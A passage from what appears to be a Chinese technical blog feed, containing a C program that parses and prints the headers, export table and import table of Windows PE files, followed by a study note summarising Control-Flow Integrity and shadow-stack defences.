(new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;							<span class="comment">//RVA指向dll名字,以0结尾</span></span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA 指向 IAT (PIMAGE_THUNK_DATA结构数组)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<p>可以看到，OriginalFirstThunk 和 FirstThunk 指向的内容分别是 INT 和 IAT ，但实际上 INT 和 IAT 的内容是一样的，所以他们指向的内容是一样的，只是方式不同而已，下图可以完美的解释</p>
<p><img src="/08/cl7iordox000z293f4xezub16/1.jpg" alt></p>
<p>但是上图只是PE文件加载前的情况，PE文件一旦运行起来，就会变成下图的情况</p>
<p><img src="/08/cl7iordox000z293f4xezub16/2.jpg" alt></p>
<h2 id="PE-Viewer"><a href="#PE-Viewer" class="headerlink" title="PE-Viewer"></a>PE-Viewer</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication3.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RVAOffset</span><span class="params">(PIMAGE_NT_HEADERS pNtHeader, DWORD Rva)</span> </span>&#123;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHeader);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">		DWORD SectionBeginRva = pSectionHeader[i].VirtualAddress;</span><br><span class="line">		DWORD SectionEndRva = pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData;</span><br><span class="line">		<span class="keyword">if</span> (Rva &gt;= SectionBeginRva &amp;&amp; Rva &lt;= SectionEndRva) &#123;</span><br><span class="line">			DWORD Temp = Rva - SectionBeginRva;</span><br><span class="line">			DWORD Rwa = Temp + pSectionHeader[i].PointerToRawData;</span><br><span class="line">			<span class="keyword">return</span> Rwa;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	HANDLE hMapping;</span><br><span class="line">	WCHAR szFilePath[MAX_PATH];</span><br><span class="line">	LPVOID ImageBase;</span><br><span class="line">	PIMAGE_DOS_HEADER  pDH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_DOS结构的指针</span></span><br><span class="line">	PIMAGE_NT_HEADERS  pNtH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_NT结构的指针</span></span><br><span class="line">	PIMAGE_FILE_HEADER pFH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_FILE结构的指针</span></span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_OPTIONALE结构的指针</span></span><br><span class="line">	OPENFILENAME ofn;<span class="comment">//定义结构，调用打开对话框选择要分析的文件及其保存路径</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(szFilePath, <span class="number">0</span>, MAX_PATH);</span><br><span class="line">	<span class="built_in">memset</span>(&amp;ofn, <span class="number">0</span>, <span class="keyword">sizeof</span>(ofn));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//打开一个窗口，选择文件</span></span><br><span class="line">	ofn.lStructSize = <span class="keyword">sizeof</span>(ofn);</span><br><span class="line">	ofn.hwndOwner = <span class="literal">NULL</span>;</span><br><span class="line">	ofn.hInstance = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">	ofn.nMaxFile = MAX_PATH;</span><br><span class="line">	ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;</span><br><span class="line">	ofn.lpstrInitialDir = <span class="string">L"."</span>;</span><br><span class="line">	ofn.lpstrFile = szFilePath;</span><br><span class="line">	ofn.lpstrTitle = <span class="string">L"chose a PE file --by w00d"</span>;</span><br><span class="line">	ofn.lpstrFilter = <span class="string">L"*.*\0*.*\0"</span>;</span><br><span class="line">	<span class="keyword">if</span> (!GetOpenFileName(&amp;ofn)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"打开文件错误:%d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hFile = CreateFile(szFilePath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hFile) &#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">L"打开文件错误"</span>, <span class="literal">NULL</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	hMapping = CreateFileMapping(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hMapping) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"创建映射错误%d"</span>, GetLastError());</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ImageBase = MapViewOfFile(hMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!ImageBase) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"文件映射错误:%d"</span>, GetLastError());</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  PE头的判断                                 */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"--------------------PEheader------------------------\n"</span>);</span><br><span class="line">	pDH = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">	<span class="keyword">if</span> (pDH-&gt;e_magic != IMAGE_DOS_SIGNATURE) <span class="comment">//判断是否是MZ</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Not a valid PE file 2!\n"</span>);</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pNtH = (PIMAGE_NT_HEADERS)((DWORD)pDH + pDH-&gt;e_lfanew); <span class="comment">//判断是否为PE格式</span></span><br><span class="line">	<span class="keyword">if</span> (pNtH-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Not a valid PE file 3!\n"</span>);</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"PE e_lfanew is: 0x%x\n"</span>, pNtH);</span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  FileHeader                                */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	pFH = &amp;pNtH-&gt;FileHeader;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------FileHeader------------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NumberOfSections: %d\n"</span>, pFH-&gt;NumberOfSections);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"SizeOfOptionalHeader: %d\n"</span>, pFH-&gt;SizeOfOptionalHeader);</span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  OptionalHeader                            */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	pOH = &amp;pNtH-&gt;OptionalHeader;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------OptionalHeader---------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"SizeOfCode:0x%08x\n"</span>, pOH-&gt;SizeOfCode);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"AddressOfEntryPoint: 0x%08X\n"</span>, pOH-&gt;AddressOfEntryPoint);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"ImageBase is 0x%x\n"</span>, ImageBase);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"SectionAlignment: 0x%08x\n"</span>, pOH-&gt;SectionAlignment);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"FileAlignment: 0x%08x\n"</span>, pOH-&gt;FileAlignment);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"SizeOfImage: 0x%08x\n"</span>, pOH-&gt;SizeOfImage);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"SizeOfHeaders: 0x%08x\n"</span>, pOH-&gt;SizeOfHeaders);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NumberOfRvaAndSizes: 0x%08x\n"</span>, pOH-&gt;NumberOfRvaAndSizes);</span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  SectionTable                              */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="keyword">int</span> SectionNumber = <span class="number">0</span>;</span><br><span class="line">	DWORD SectionHeaderOffset = (DWORD)pNtH + <span class="number">24</span> + (DWORD)pFH-&gt;SizeOfOptionalHeader; <span class="comment">//节表位置的计算</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"--------------------SectionTable---------------------\n"</span>);</span><br><span class="line">	<span class="keyword">for</span> (SectionNumber; SectionNumber &lt; pFH-&gt;NumberOfSections; SectionNumber++) &#123;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSh = (PIMAGE_SECTION_HEADER)(SectionHeaderOffset + <span class="number">40</span> * SectionNumber);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d 's Name is %s\n"</span>, SectionNumber + <span class="number">1</span>, pSh-&gt;Name);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"VirtualAddress: 0x%08X\n"</span>, (DWORD)pSh-&gt;VirtualAddress);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"SizeOfRawData: 0x%08X\n"</span>, (DWORD)pSh-&gt;SizeOfRawData);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"PointerToRawData: 0x%08X\n"</span>, (DWORD)pSh-&gt;PointerToRawData);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  ExportTable                               */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"--------------------ExportTable----------------------\n"</span>);</span><br><span class="line">	DWORD Export_table_offset = RVAOffset(pNtH, (DWORD)pNtH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)ImageBase + Export_table_offset);</span><br><span class="line">	DWORD EXport_table_offset_Name = (DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;Name);</span><br><span class="line">	DWORD * pNameOfAddress = (DWORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNames));</span><br><span class="line">	DWORD * pFunctionOfAdress = (DWORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfFunctions));</span><br><span class="line">	WORD * pNameOrdinalOfAddress = (WORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNameOrdinals));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Name:%s\n"</span>, EXport_table_offset_Name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NameOfAddress:%08X\n"</span>, RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNames));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"FunctionOfAdress:%08X\n"</span>, RVAOffset(pNtH, pExportDirectory-&gt;AddressOfFunctions));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NameOrdinalOfAddress:%08X\n"</span>, RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNameOrdinals));</span><br><span class="line">	<span class="keyword">if</span> (pExportDirectory-&gt;NumberOfFunctions == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"!!!!!!!!!!!!!!!!!NO EXPORT!!!!!!!!!!!!!!!!!!!!!"</span>);</span><br><span class="line">		<span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			CloseHandle(hFile);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (hMapping != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			CloseHandle(hMapping);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (ImageBase != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			UnmapViewOfFile(ImageBase);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NumberOfNames:%d\n"</span>, pExportDirectory-&gt;NumberOfNames);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NumberOfFunctions:%d\n"</span>, pExportDirectory-&gt;NumberOfFunctions);</span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  ImportTable                               */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"--------------------ImportTable----------------------\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> cont = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwImportOffset = RVAOffset(pNtH, pNtH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">		dwImportOffset = dwImportOffset + cont;</span><br><span class="line">		PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)ImageBase + dwImportOffset);</span><br><span class="line">		<span class="keyword">if</span> (pImport-&gt;OriginalFirstThunk == <span class="number">0</span> &amp;&amp; pImport-&gt;TimeDateStamp == <span class="number">0</span> &amp;&amp; pImport-&gt;ForwarderChain == <span class="number">0</span> &amp;&amp; pImport-&gt;Name == <span class="number">0</span> &amp;&amp; pImport-&gt;FirstThunk == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		DWORD dwOriginalFirstThunk = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;OriginalFirstThunk);</span><br><span class="line">		DWORD dwFirstThunk = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;FirstThunk);</span><br><span class="line">		DWORD dwName = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;Name);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"---------Import File Name: %s\n"</span>, dwName);</span><br><span class="line">		<span class="keyword">if</span> (dwOriginalFirstThunk == <span class="number">0x00000000</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			dwOriginalFirstThunk = dwFirstThunk;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD* pdwTrunkData = (DWORD*)dwOriginalFirstThunk;</span><br><span class="line">		<span class="keyword">int</span> n = <span class="number">0</span>, x = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (pdwTrunkData[n] != <span class="number">0</span>) &#123;</span><br><span class="line">			DWORD TrunkData = pdwTrunkData[n];</span><br><span class="line">			<span class="keyword">if</span> (TrunkData &lt; IMAGE_ORDINAL_FLAG32)<span class="comment">//名字导入</span></span><br><span class="line">			&#123;</span><br><span class="line">				PIMAGE_IMPORT_BY_NAME pInportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)ImageBase + RVAOffset(pNtH, TrunkData));</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"ImportByName: %s\n"</span>, pInportByName-&gt;Name);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				DWORD FunNumber = (DWORD)(TrunkData - IMAGE_ORDINAL_FLAG32);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"ImportByNumber: %-4d \n"</span>, FunNumber);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (x != <span class="number">0</span> &amp;&amp; x % <span class="number">3</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">			n++;</span><br><span class="line">			x++;</span><br><span class="line">		&#125;</span><br><span class="line">		cont = cont + <span class="number">40</span>;<span class="comment">//其实这里的40不是太理解，这个导入表不应该只有一个么，为什么是个循环</span></span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (ImageBase)</span><br><span class="line">		&#123;</span><br><span class="line">			UnmapViewOfFile(ImageBase);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (hMapping)</span><br><span class="line">		&#123;</span><br><span class="line">			CloseHandle(hMapping);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			CloseHandle(hFile);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>程序员的自我修养</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>CFI与影子堆栈</title>
    <url>/year/06/28/cl7iordoc000h293fnzroxh8w/</url>
    <content><![CDATA[<p>最近读论文碰到了CFI和影子堆栈相关，记录一下，添加一些自己的感想。</p>
<p>参考<a href="https://blog.csdn.net/zko1021/article/details/85250383" target="_blank" rel="noopener">https://blog.csdn.net/zko1021/article/details/85250383</a></p>
<p><a href="http://readm.tech/2016/11/09/cet-shadow_stacks/" target="_blank" rel="noopener">http://readm.tech/2016/11/09/cet-shadow_stacks/</a></p>
<a id="more"></a>

<p>本文讨论的原理基于<a href="https://www.researchgate.net/publication/228733728_Control-flow_integrity_principles_implementations_and_applications" target="_blank" rel="noopener">Control-Flow Integrity Principles, Implementations, and Applications</a>这篇论文。</p>
<h2 id="1-回顾为什么需要CFI"><a href="#1-回顾为什么需要CFI" class="headerlink" title="1 回顾为什么需要CFI"></a>1 回顾为什么需要CFI</h2><h3 id="1-1-劫持控制流"><a href="#1-1-劫持控制流" class="headerlink" title="1.1 劫持控制流"></a>1.1 劫持控制流</h3><ul>
<li>攻击者能够通过控制流劫持来获取目标机器的控制权，甚至进行提权操作，对目标机器进行全面控制。</li>
<li>早期的攻击通常采用代码注入的方式，通过上载一段代码，将控制转向这段代码执行。</li>
<li>代码重用攻击使得硬件支持下的DEP保护机制仍能被绕过。</li>
</ul>
<h3 id="1-2-早期防范措施"><a href="#1-2-早期防范措施" class="headerlink" title="1.2 早期防范措施"></a>1.2 早期防范措施</h3><ul>
<li>堆栈金丝雀[Cowan et al. 1998]，运行时消除缓冲区溢出[Ruwase and Lam 2004]等。</li>
<li>局限性：缓解范围有限，性能损失高，依赖于硬件修改等。</li>
<li>What we need：高可靠性，易于理解，强制执行，可部署性，低开销。</li>
</ul>
<p>总结下大概早起防范就是金丝雀，和NX保护，以及代码段的随机化。canary保护其实挺强的了，一般的栈溢出是可以做到防护的，但是如果存在类似于任意地址写，格式化字符串漏洞等，还是无法避免返回地址被劫持。</p>
<h2 id="2-CFI概述"><a href="#2-CFI概述" class="headerlink" title="2 CFI概述"></a>2 CFI概述</h2><p><em>CFI关注的是间接指令，所以在这里对汇编语言中不同寻址方式的指令进行补充说明。</em></p>
<p>在汇编语言中，根据寻址方式的不同可以分为两种跳转指令。一种是<strong>间接跳转指令</strong>，另一种是<strong>直接跳转指令</strong>。</p>
<p>直接跳转指令的示例如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CALL 0x1060000F</span><br></pre></td></tr></table></figure>

<p>在程序执行到这条语句时，就会将指令寄存器的值替换为0x1060000F。这种在指令中直接给出跳转地址的寻址方式就叫做直接转移。在高级语言中, 像if-else，静态函数调用这种跳转目标往往可以确定的语句就会被转换为直接跳转指令。</p>
<p>间接跳转指令则是使用数据寻址方式间接的指出转移地址，如:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JMP EBX</span><br></pre></td></tr></table></figure>

<p>执行完这条指令之后，指令寄存器的值就被替换为EBX寄存器的值。它的转换对象为作为回调参数的函数指针等动态决定目标地址的语句。</p>
<p>在CFI中还有一个比较特殊的分类方式，就是<strong>前向和后向转移</strong>。将控制权定向到程序中一个新位置的转移方式， 就叫做前向转移, 比如jmp和call指令；而将控制权返回到先前位置的就叫做后向转移，最常见的就是ret指令。</p>
<p>将以上两种分类方式结合起来，前向转移指令call和jmp根据寻址方式不同又可以分为直接jmp, 间接jmp，直接call，间接call四种。而后向<strong>转移指令ret没有操作数</strong>，它的目标地址计算是通过从栈中弹出的数来决定的。正<strong>因为ret指令的特性，引发了一系列针对返回地址的攻击</strong>。</p>
<h3 id="2-2-核心思想"><a href="#2-2-核心思想" class="headerlink" title="2.2 核心思想"></a>2.2 核心思想</h3><p>限制程序运行中的控制转移，使之始终处于原有的控制流图所限定的范围内。<br><strong>它规定软件执行必须遵循提前确定的控制流图（CFG）的路径。</strong></p>
<p>通过分析程序的控制流图，获取间接转移指令（包括间接跳转、间接调用、和函数返回指令）目标的白名单，并在运行过程中，核对间接转移指令的目标是否在白名单中。</p>
<p><strong>通过二进制代码重写实现：插桩—— IDs ID检查</strong></p>
<p>利用二进制重写技术向软件函数入口及调用返回处分别插入标识符ID和ID_check，通过对比ID和ID_check的值是否一致判断软件的函数执行过程是否符合预期，从而判断软件是否被篡改。</p>
<h3 id="2-3-示例：通过插桩执行CFI"><a href="#2-3-示例：通过插桩执行CFI" class="headerlink" title="2.3 示例：通过插桩执行CFI"></a>2.3 示例：通过插桩执行CFI</h3><p>CFI要求在程序执行期间，只要机器代码指令转移控制，只能转移到有效目标，这是由提前创建的CFG确定的。</p>
<blockquote>
<p>文中提到，期望在不久的将来部署硬件CFI支持是不现实的，所以该文章仅讨论软件CFI实现（也是有局限性的，在提出和发展那篇里曾提到）。内联CFI插桩可以在当前处理器上的软件中实现，特别是在x86处理器上，只需要适度的开销。</p>
</blockquote>
<p>CFI插桩根据给定的CFG修改每个源指令和计算控制流传输的每个可能的目标指令。</p>
<p><em>示例：</em></p>
<p><img src="/28/cl7iordoc000h293fnzroxh8w/1.png" alt></p>
<p>左侧是一个C程序片段，其中函数sort2调用sort的函数排序两次，首先使用lt，然后使用gt。它们作为<strong>指向比较函数的指针</strong>。右侧显示了这四个函数的二进制代码块的轮廓以及它们之间的所有CFG边。</p>
<ul>
<li>直接调用的边为浅色虚线箭头</li>
<li>源指令的边为实线箭头</li>
<li>返回边为虚线箭头</li>
</ul>
<p>因此，CFI检测包括sort2主体中的两个ID，以及从排序返回时的ID检查，使用55（这里是随意使用55来表示）作为ID位模式。同样，因为sort可以调用lt 或者gt，两个比较函数都以ID 17开头; 并且使用寄存器R中的函数指针的调用指令对17执行ID检查。最后，ID 23在sort中标识比较调用点之后的块，因此两个比较函数都检查返回ID 23。</p>
<p>CFI检测不会影响直接函数调用：<strong>只有间接调用需要ID检查，并且只有间接调用的函数（例如虚方法）才需要添加ID。</strong></p>
<p>函数返回多个ID检查时，必须在每个函数调用点之后插入ID，无论该函数是否间接调用。剩余的计算控制流通常是switch语句和异常的结果。在两种情况下，每个可能的目标都需要一个ID，并且在发送点需要ID检查。</p>
<h3 id="2-4-CFI插桩代码"><a href="#2-4-CFI插桩代码" class="headerlink" title="2.4 CFI插桩代码"></a>2.4 CFI插桩代码</h3><p>选择特定的二进制码序列实现ID和ID检查。</p>
<p><img src="/28/cl7iordoc000h293fnzroxh8w/2.png" alt></p>
<p>上图中，这里，目标已在ecx中，所以ID检查不必将其移动到寄存器（通常ID检查需要这样做来避免竞争条件）。跳转指令jmp ecx的目标可能是来自堆栈的mov（下图所示）。</p>
<p>在（a）中，ID作为数据插入到目标mov指令之前，并且ID检查使用lea指令修改计算的目标，以跳过四个ID字节。ID检查直接将原始目的地与ID值进行比较。ID位模式嵌入在ID-check cmp操作码字节内。 因此，在（a）中，可能以某种方式影响ecx寄存器的值的攻击者可能会导致跳转到jne指令而不是预期的目标。</p>
<p>（b）通过在ID检查中使用ID-1作为常量并将其递增以在运行时计算ID来避免（a）的微妙之处。 另外，替代方案（b）不修改计算的跳转目标，而是有效地在目标的开始处插入labelID：使用无副作用的x86预取指令来合成labelID指令。（其实这个b我不太懂那个inc eax这个的作用)</p>
<p><img src="/28/cl7iordoc000h293fnzroxh8w/3.png" alt></p>
<h3 id="2-5-CFI的三个重要假设"><a href="#2-5-CFI的三个重要假设" class="headerlink" title="2.5 CFI的三个重要假设"></a>2.5 CFI的三个重要假设</h3><p>实现CFI，三个假设成立至关重要。 这三个假设是：</p>
<p><strong>UNQ.</strong> 唯一ID：在CFI检测之后，除了ID和ID检查之外，选择为ID的位模式不得出现在代码存储器中的任何位置。通过使ID足够大（例如32位，对于合理大小的软件）并且通过选择ID使得它们不与软件的其余部分中的操作码字节冲突，可以容易地实现该属性。</p>
<p><strong>NWC.</strong> 不可写代码：程序必须无法在运行时修改代码内存。否则，攻击者可能能够绕过CFI，例如通过覆盖ID检查。除了在加载动态库和运行时代码生成期间，NWC在大多数当前系统中已经是正确的。</p>
<p><strong>NXD.</strong> 不可执行数据：程序必须不能像执行代码那样执行数据。否则，攻击者可能会导致执行标有预期ID的数据。最新的x86处理器上的硬件支持NXD，Windows XP SP2使用此支持来强制分离代码和数据[Microsoft Corporation 2004]。 NXD也可以用软件实现[PaX Project 2004]。NXD本身（没有CFI）阻止了一些攻击，但不适于那些利用预先存在的代码的攻击，例如“jump-to-libc”攻击。</p>
<h3 id="2-6-CFI执行的阶段"><a href="#2-6-CFI执行的阶段" class="headerlink" title="2.6 CFI执行的阶段"></a>2.6 CFI执行的阶段</h3><p>第一阶段，即用于CFI执行的CFG的构建，从程序分析到安全策略规范。实际实施可以使用标准控制流分析技术（例如，[Aho et al. 1985; Atkinson 2002; Wagner and Dean 2001]）。</p>
<p>在CFI检测之后（可能在安装时），另一种机制可以建立UNQ假设。无论何时安装或修改软件，都可以更新ID以保持唯一性，就像某些操作系统中的预绑定信息一样[Apple Computer 2003]。</p>
<p>最后，CFI验证阶段可以静态验证直接跳转和类似指令，正确插入ID和ID检查以及UNQ属性。验证可以看作是PCC校对检查的一个特例，其中插桩不需要明确的逻辑校验。建立CFI只需要验证：设备中的设计或实施缺陷不会危及安全性。</p>
<h3 id="2-7-CFI实施"><a href="#2-7-CFI实施" class="headerlink" title="2.7  CFI实施"></a>2.7  CFI实施</h3><blockquote>
<p>Vulcan [Srivastava et al.2001]：一个成熟的、最先进的x86二进制文件检测系统，既不需要重新编译也不需要源代码访问。该系统以实用的方式解决了二进制代码重写的挑战。</p>
</blockquote>
<p>使用Vulcan来构建正在检测的程序的CFG。这个CFG构造正确处理执行计算控制流传输的x86指令，包括函数返回，通过函数指针调用，以及为switch语句和动态调度发出的指令。每个计算出的调用指令可以转到任何采用其地址的函数：通过对二进制文件中的重定位条目进行流不敏感分析来发现这些函数。</p>
